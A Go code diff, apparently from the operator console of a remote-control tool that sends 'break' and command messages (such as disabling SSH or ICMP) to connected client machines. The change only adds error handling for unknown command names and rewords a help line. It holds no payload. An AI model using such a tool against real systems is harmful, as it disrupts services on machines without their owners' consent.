@@ -326,6 +326,10 @@ func readStdin() {
 						"ssh.break-service",
 					}
 					breakSend := CreateCommandList(breakList, "BREAK", valids)
+					if breakSend == "ERR" {
+						caret()
+						break
+					}
 					SendMessage(breakSend, client.conn)
 				} else {
 					errorln("Error: Can only use break with encoded clients")
@@ -355,6 +359,10 @@ func readStdin() {
 						"safemode:on",
 					}
 					cmdSend := CreateCommandList(cmdList, "CMD", valids)
+					if cmdSend == "ERR" {
+						caret()
+						break
+					}
 					if strings.Contains(cmdSend, "safemode") {
 						cmdSend = strings.ToUpper(cmdSend)
 					}
@@ -405,6 +413,7 @@ func CreateCommandList(breakList []string, typ string, valids []string) string {
 			arr = append(arr, brk)
 		} else {
 			errorf("Error at index %d: Unknown %s\n", i, strings.ToLower(typ))
+			return "ERR"
 		}
 	}
 	send := typ + ":{" + strings.Join(arr, ",") + "}"
@@ -485,7 +494,7 @@ func displayHelp(cmd string) {
 	case "break":
 		fmt.Printf(
 			"Usage: break [service]\n" +
-				"Possible services:\n" +
+				"Possible breaks:\n" +
 				"icmp\n" +
 				"icmp.out\n" +
 				"ftp\n" +
